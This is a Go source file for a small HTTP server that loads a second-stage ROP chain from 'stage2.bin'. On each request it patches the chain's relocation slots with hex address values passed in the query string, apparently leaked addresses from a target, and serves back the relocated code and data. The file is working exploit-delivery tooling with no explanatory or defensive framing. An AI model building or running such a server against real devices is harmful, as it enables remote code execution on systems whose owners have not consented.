package main

import (
    "bytes"
    "encoding/binary"
    "fmt"
    "net/http"
    "os"
    "strconv"
)

var source []uint32
var relocs []byte

func handler(w http.ResponseWriter, r *http.Request) {
    const num_args = 7
    var args [num_args + 1]uint32
    args[0] = 0

    payload := make([]uint32, len(source))
    copy(payload, source)
    dsize := payload[0x10/4]
    csize := payload[0x20/4]

    for i := 1; i <= num_args; i++ {
        arg, _ := strconv.ParseUint(r.URL.Query().Get(fmt.Sprintf("a%d", i)), 16, 32)
        args[i] = uint32(arg)
    }
    args[1] += csize

    for i := 0; i < len(relocs); i++ {
        payload[i] += args[relocs[i]]
    }

    code_start := uint32(0x40 + dsize)
    data_start := uint32(0x40)
    binary.Write(w, binary.LittleEndian, payload[code_start / 4:(code_start + csize) / 4])
    binary.Write(w, binary.LittleEndian, payload[data_start / 4:(data_start + dsize) / 4])
}

func main() {
    f, err := os.Open("stage2.bin")
    if err != nil {
        panic(err)
    }

    fi, _ := f.Stat()
    buf := make([]byte, fi.Size())
    f.Read(buf)
    f.Close()

    p := bytes.NewReader(buf)
    var size_words uint32
    binary.Read(p, binary.LittleEndian, &size_words)
    fmt.Printf("Rop size in words: 0x%x\n", size_words)
    source = make([]uint32, size_words)
    relocs = make([]byte, size_words)
    binary.Read(p, binary.LittleEndian, source)
    binary.Read(p, binary.LittleEndian, relocs)

    http.HandleFunc("/", handler)
    http.ListenAndServe(":4000", nil)
}
